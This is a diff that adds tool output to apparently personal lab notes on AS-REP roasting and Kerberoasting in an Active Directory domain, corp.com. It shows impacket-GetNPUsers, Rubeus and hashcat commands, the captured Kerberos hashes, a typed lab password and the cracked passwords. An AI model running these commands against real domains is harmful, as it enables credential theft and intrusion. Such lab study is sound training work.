@@ -354,16 +354,23 @@ After obtaining the AS-REP from the DC, however, an attacker could perform an of
 
 ```bash
 impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
+	Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+	
+	Password:
+Nexus123!
 
-
-
-
+	Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
+	----  ----------------------------------------  --------------------------  --------------------------  --------
+	dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-08-15 18:50:28.120337  0x410200 
+	$krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad85d4e993e$63d4f20107561af445642f5bc83291f78351dbe5e61d94f2c991fe03c6d81f71c8e6f2ace3fed38aacf5f020c6d8648196a24ef8b3ac828b8e0dff37873772ab5d64d0dae4a7d51a494c7c6332dceb44d614aac6fe3eed63678b423d3c13dcb36ba58d5a8c64c809e67d7222590bf5fcd131bd874068c42e66215ad4c166c4b251320da478c9c9f0b37520f770aca67e05425244095d03d4e47af00cf21e0b6d062e480bf967423b139f9d3c80ba5592fa599b243e5e73c26c8f5242e5e71b2523590de738243893fa55b11599bf393d94499341220e0ca45c8375f3617e9607c065b416
 ```
 	- -dc-ip - IP address of the domain controller
 	- -request - Request a TGT
 	- -outputfile - Name of the file the AS-REP hash will be stored (hashcat format)
 	- corp.com/pete - Auth target in **domain/user** format
 		- This is the user we use for authenticating
+
+> Had to run the above command twice to get it to work.  Careful w/ copy/pasting!
 
 Above shows that _dave_ has the user account option _Do not require Kerberos preauthentication_ enabled, meaning it's vulnerable to AS-REP Roasting
 
@@ -384,13 +391,15 @@ hashcat --help | grep -i "Kerberos"
 - Offline crack AS-REP hash
 ```bash
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
-
-
-
-
-
+	...
+	$krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad85d4e993e$63d4f20107561af445642f5bc83291f78351dbe5e61d94f2c991fe03c6d81f71c8e6f2ace3fed38aacf5f020c6d8648196a24ef8b3ac828b8e0dff37873772ab5d64d0dae4a7d51a494c7c6332dceb44d614aac6fe3eed63678b423d3c13dcb36ba58d5a8c64c809e67d7222590bf5fcd131bd874068c42e66215ad4c166c4b251320da478c9c9f0b37520f770aca67e05425244095d03d4e47af00cf21e0b6d062e480bf967423b139f9d3c80ba5592fa599b243e5e73c26c8f5242e5e71b2523590de738243893fa55b11599bf393d94499341220e0ca45c8375f3617e9607c065b416:Flowers1
+    
+	Session..........: hashcat
+	Status...........: Cracked
+	Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+	Hash.Target......: $krb5asrep$23$dave@CORP.COM:00b3bff8d5eb5394e2873ad...65b416
+	Time.Started.....: Thu Aug 15 19:44:07 2024, (0 secs)
+	Time.Estimated...: Thu Aug 15 19:44:07 2024, (0 secs)
 ```
 
 >To identify users with the enabled AD user account option _Do not require Kerberos preauthentication_, we can use _impacket-GetNPUsers_ as shown without the **-request** and **-outputfile** options.
@@ -404,14 +413,27 @@ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr
 - Automatically id vuln user accounts
 ```powershell
 .\Rubeus.exe asreproast /nowrap
-
-
-
-
-
-
-
-
+	   ______        _
+	  (_____ \      | |
+	   _____) )_   _| |__  _____ _   _  ___
+	  |  __  /| | | |  _ \| ___ | | | |/___)
+	  | |  \ \| |_| | |_) ) ____| |_| |___ |
+	  |_|   |_|____/|____/|_____)____/(___/
+	
+	  v2.1.2
+	
+	[*] Action: AS-REP roasting
+	
+	[*] Target Domain          : corp.com
+	
+	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+	[*] SamAccountName         : dave
+	[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
+	[*] Using domain controller: DC1.corp.com (192.168.170.70)
+	[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
+	[+] AS-REQ w/o preauth successful!
+	[*] AS-REP hash:
+	      $krb5asrep$dave@corp.com:4A9CE5DAC38B8BE40207F0D48449529F$3253BE584C6E6A0F6E068F5E7A0F9E57F633B56003F1855E3AF7D68820BEE605FD898864EF6FB9546CBB9DB16BD620A08BB883A28F7094EE6DA1815118D718EE02D578A6D9DF788D2955B0FDE576F3C92FE03B3804E1631DE4B960A2B12FBAE6845AF67A870F930410D04488A7356E6F1ED31AE4404B8AC42AF50F209581A623C9B4B67F51E75C8968BCFDAFC848C93FA35945EB1AC9DE876BE8B2C64CFCE36D7BA1B52E8B8E3DB281694A31F381BDE7E4600334EB962E9EC59A949BD66A2CB7C362042E19F8946239D4506D7768E98AF83CF17D9ED0E8486F6612E9D2D587372D2F69B1
 ```
 	- When used while logged in as a pre-authed domain user, we don't need to add in any options other than `asreproast`
 	- /nowrap - Prevent new lines being added to the AS-REP hash results
@@ -470,12 +492,33 @@ The service ticket is encrypted via the password hash of the SPN
 - Specify `kerberoast` command with [**Rubeus**](Tools.md#Rubeus)
 ```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-
-
-
-
-
+	   ______        _
+	  (_____ \      | |
+	   _____) )_   _| |__  _____ _   _  ___
+	  |  __  /| | | |  _ \| ___ | | | |/___)
+	  | |  \ \| |_| | |_) ) ____| |_| |___ |
+	  |_|   |_|____/|____/|_____)____/(___/
+	
+	  v2.1.2
+	
+	
+	[*] Action: Kerberoasting
+	
+	[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+	[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+	
+	[*] Target Domain          : corp.com
+	[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+	
+	[*] Total kerberoastable users : 1
+	
+	
+	[*] SamAccountName         : iis_service
+	[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+	[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+	[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+	[*] Supported ETypes       : RC4_HMAC_DEFAULT
+	[*] Hash written to C:\Tools\hashes.kerberoast
 ```
 	- /outfile - File to store TGS-Rep results
 	- Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user
@@ -499,11 +542,12 @@ hashcat --help | grep -i "Kerberos"
 - Crack
 ```bash
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
-
-
-
-
-
+	...
+	d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
+	...
 ```
+
+
+# Silver Tickets
+
+.
